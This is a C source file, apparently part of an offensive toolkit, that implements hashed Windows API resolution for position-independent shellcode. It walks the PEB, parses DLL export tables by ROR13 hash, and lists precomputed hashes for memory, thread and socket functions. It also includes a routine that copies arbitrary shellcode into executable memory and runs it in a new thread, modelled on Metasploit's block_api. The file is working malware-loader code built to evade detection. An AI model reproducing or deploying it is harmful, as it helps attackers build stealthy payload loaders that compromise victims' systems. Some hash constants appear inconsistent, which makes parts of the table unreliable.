/*
 * API Hashing & Resolution - PEB walking, export parsing
 * Core of position-independent shellcode
 */

#include <windows.h>

// ============================================================================
// HASH ALGORITHMS
// ============================================================================

// ROR13 - Metasploit block_api compatible
#define ROR(x,n) (((x)>>(n))|((x)<<(32-(n))))

__forceinline DWORD ror13(char* s)
{
    DWORD h = 0;
    while(*s) {
        h = ROR(h, 13);
        h += *s++;
    }
    return h;
}

// ROR13 wide (Unicode module names)
__forceinline DWORD ror13w(WCHAR* s)
{
    DWORD h = 0;
    while(*s) {
        WCHAR c = *s++;
        if(c >= 'A' && c <= 'Z') c += 0x20;
        h = ROR(h, 13);
        h += c;
    }
    return h;
}

// DJB2
__forceinline DWORD djb2(char* s)
{
    DWORD h = 5381;
    while(*s) h = ((h << 5) + h) + *s++;
    return h;
}

// FNV-1a
__forceinline DWORD fnv1a(char* s)
{
    DWORD h = 0x811c9dc5;
    while(*s) { h ^= *s++; h *= 0x01000193; }
    return h;
}

// CRC32 (tableless)
__forceinline DWORD crc32(char* s)
{
    DWORD crc = 0xFFFFFFFF;
    while(*s) {
        crc ^= *s++;
        for(int i = 0; i < 8; i++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

// ============================================================================
// PEB STRUCTURES (minimal)
// ============================================================================

typedef struct _U_STR {
    USHORT Len;
    USHORT Max;
    PWSTR  Buf;
} U_STR;

typedef struct _LDR_ENTRY {
    LIST_ENTRY InLoadOrder;
    LIST_ENTRY InMemOrder;
    LIST_ENTRY InInitOrder;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    U_STR      FullName;
    U_STR      BaseName;
} LDR_ENTRY;

typedef struct _PEB_LDR {
    ULONG      Len;
    BOOLEAN    Init;
    PVOID      Ss;
    LIST_ENTRY InLoadOrder;
    LIST_ENTRY InMemOrder;
    LIST_ENTRY InInitOrder;
} PEB_LDR;

typedef struct _PEB {
    BYTE       Pad[2];
    BYTE       BeingDebugged;
    BYTE       Pad2;
    PVOID      Pad3[2];
    PEB_LDR*   Ldr;
} PEB;

// ============================================================================
// PEB ACCESS
// ============================================================================

__forceinline PVOID GetPEB()
{
#ifdef _WIN64
    return (PVOID)__readgsqword(0x60);
#else
    return (PVOID)__readfsdword(0x30);
#endif
}

// ============================================================================
// MODULE RESOLUTION
// ============================================================================

PVOID GetMod(DWORD hash)
{
    PEB* peb = (PEB*)GetPEB();
    LIST_ENTRY* head = &peb->Ldr->InLoadOrder;
    LIST_ENTRY* curr = head->Flink;

    while(curr != head) {
        LDR_ENTRY* e = (LDR_ENTRY*)curr;

        if(e->BaseName.Buf) {
            if(ror13w(e->BaseName.Buf) == hash)
                return e->DllBase;
        }
        curr = curr->Flink;
    }
    return 0;
}

// Get kernel32.dll specifically (always second/third in list)
PVOID GetK32()
{
    PEB* peb = (PEB*)GetPEB();
    LIST_ENTRY* head = &peb->Ldr->InMemOrder;
    LIST_ENTRY* curr = head->Flink;

    // Skip ntdll, kernel32 is usually second in InMemoryOrder
    curr = curr->Flink;
    curr = curr->Flink;

    LDR_ENTRY* e = CONTAINING_RECORD(curr, LDR_ENTRY, InMemOrder);
    return e->DllBase;
}

// ============================================================================
// EXPORT RESOLUTION
// ============================================================================

#define RVA(b,r) ((BYTE*)(b)+(r))

PVOID GetProc(PVOID mod, DWORD hash)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)RVA(mod, dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)
        RVA(mod, nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* names = (DWORD*)RVA(mod, exp->AddressOfNames);
    WORD*  ords  = (WORD*)RVA(mod, exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)RVA(mod, exp->AddressOfFunctions);

    for(DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* fn = (char*)RVA(mod, names[i]);
        if(ror13(fn) == hash)
            return RVA(mod, funcs[ords[i]]);
    }
    return 0;
}

// Combined lookup
PVOID GetAPI(DWORD mod_hash, DWORD fn_hash)
{
    PVOID mod = GetMod(mod_hash);
    if(!mod) return 0;
    return GetProc(mod, fn_hash);
}

// ============================================================================
// PRECOMPUTED HASHES (ROR13)
// ============================================================================

// Modules
#define H_KERNEL32           0x6A4ABC5B
#define H_NTDLL              0x3CFA685D
#define H_USER32             0x63C84283
#define H_WS2_32             0x006B8029
#define H_WININET            0x0726774C
#define H_WINHTTP            0xC69F8957
#define H_ADVAPI32           0x76C8F2EB

// kernel32.dll functions
#define H_LoadLibraryA       0xEC0E4E8E
#define H_GetProcAddress     0x7C0DFCAA
#define H_VirtualAlloc       0x91AFCA54
#define H_VirtualProtect     0x7946C61B
#define H_VirtualFree        0x30633AC
#define H_CreateThread       0x160D6838
#define H_WaitForSingleObject 0xF3B63C01
#define H_ExitProcess        0x73E2D87E
#define H_GetModuleHandleA   0xD3324904
#define H_CloseHandle        0xFFC97C1F
#define H_CreateFileA        0x7C0017A5

// ntdll.dll functions
#define H_NtAllocateVirtualMemory    0x6793C34C
#define H_NtProtectVirtualMemory     0x50E92888
#define H_NtWriteVirtualMemory       0xC3170192
#define H_NtCreateThreadEx           0x76B339F3
#define H_RtlMoveMemory              0xBB5A1A44

// ws2_32.dll functions
#define H_WSAStartup         0x006B8029
#define H_WSASocketA         0xE0DF0FEA
#define H_connect            0x6174A599
#define H_recv               0xE71819B6
#define H_send               0xE80A791F
#define H_closesocket        0x614D6E75

// ============================================================================
// FUNCTION TYPEDEFS
// ============================================================================

typedef HMODULE (WINAPI *t_LLA)(LPCSTR);
typedef FARPROC (WINAPI *t_GPA)(HMODULE, LPCSTR);
typedef PVOID   (WINAPI *t_VA)(PVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *t_VP)(PVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *t_VF)(PVOID, SIZE_T, DWORD);
typedef HANDLE  (WINAPI *t_CT)(PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);
typedef DWORD   (WINAPI *t_WFSO)(HANDLE, DWORD);
typedef void    (WINAPI *t_EP)(UINT);

// ============================================================================
// API TABLE PATTERN
// ============================================================================

typedef struct {
    t_LLA  LoadLibraryA;
    t_GPA  GetProcAddress;
    t_VA   VirtualAlloc;
    t_VP   VirtualProtect;
    t_CT   CreateThread;
    t_WFSO WaitForSingleObject;
    t_EP   ExitProcess;
} API_TBL;

void ResolveAPIs(API_TBL* api)
{
    PVOID k32 = GetMod(H_KERNEL32);

    api->LoadLibraryA       = (t_LLA)GetProc(k32, H_LoadLibraryA);
    api->GetProcAddress     = (t_GPA)GetProc(k32, H_GetProcAddress);
    api->VirtualAlloc       = (t_VA)GetProc(k32, H_VirtualAlloc);
    api->VirtualProtect     = (t_VP)GetProc(k32, H_VirtualProtect);
    api->CreateThread       = (t_CT)GetProc(k32, H_CreateThread);
    api->WaitForSingleObject = (t_WFSO)GetProc(k32, H_WaitForSingleObject);
    api->ExitProcess        = (t_EP)GetProc(k32, H_ExitProcess);
}

// ============================================================================
// SHELLCODE PATTERN - Alloc + Exec
// ============================================================================

void ShellcodeExec(BYTE* sc, DWORD len)
{
    API_TBL api;
    ResolveAPIs(&api);

    PVOID p = api.VirtualAlloc(0, len, 0x3000, 0x40);
    for(DWORD i = 0; i < len; i++)
        ((BYTE*)p)[i] = sc[i];

    HANDLE h = api.CreateThread(0, 0, p, 0, 0, 0);
    api.WaitForSingleObject(h, INFINITE);
}

// ============================================================================
// METASPLOIT BLOCK_API PATTERN
// ============================================================================

/*
 * block_api receives function hash on stack
 * Walks PEB, finds module, finds export by hash
 * Returns function address in RAX
 *
 * Usage in shellcode:
 *   push H_VirtualAlloc
 *   call block_api
 *   ; rax = VirtualAlloc address
 *   call rax
 */

// ============================================================================
// EOF
// ============================================================================
